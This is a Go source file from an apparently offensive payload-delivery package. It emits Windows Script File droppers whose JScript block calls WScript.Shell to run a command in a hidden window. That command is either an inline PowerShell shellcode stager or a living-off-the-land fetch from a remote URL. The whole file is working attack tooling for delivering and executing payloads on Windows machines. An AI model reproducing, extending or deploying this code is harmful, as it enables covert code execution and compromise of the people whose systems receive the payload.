// wsf.go — emit a Windows Script File (.wsf). A WSF is an XML container that can
// hold multiple <script> blocks in different languages; `cscript //nologo
// payload.wsf` (or `wscript payload.wsf`) runs them. We wrap the same JScript
// payload js.go emits in a <job><script language="JScript">…</script></job>
// envelope — the inline powershell stager (inline mode) or a LOLBin fetch (remote).
package delivery

import "strings"

type wsfEmitter struct{}

func (wsfEmitter) Name() string { return "wsf" }
func (wsfEmitter) Ext() string  { return "wsf" }

func (wsfEmitter) Emit(s *Spec) ([]Artifact, error) {
	var cmd string
	switch {
	case s.Remote():
		cmd = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		cmd = launcherInlineCmd(s.Shellcode)
	default:
		return nil, errPayloadRequired("wsf")
	}
	body := wsfBody(cmd)
	return []Artifact{writeFile("payload.wsf", []byte(body))}, nil
}

// wsfBody renders a minimal WSF whose JScript block runs `cmd` hidden. The XML
// wrapper mirrors sct.go's structure (CDATA-escaped JScript) but uses the WSF
// <package><job> schema instead of a scriptlet <registration> block.
func wsfBody(cmd string) string {
	var b strings.Builder
	b.WriteString(`<?xml version="1.0"?>` + "\n")
	b.WriteString("<package>\n")
	b.WriteString("<job id=\"s\">\n")
	b.WriteString(`<script language="JScript">` + "\n")
	b.WriteString("<![CDATA[\n")
	b.WriteString("var s = new ActiveXObject(\"WScript.Shell\");\n")
	b.WriteString("s.Run(\"" + jsEscape(cmd) + "\", 0, false);\n")
	b.WriteString("]]>\n")
	b.WriteString("</script>\n")
	b.WriteString("</job>\n")
	b.WriteString("</package>\n")
	return b.String()
}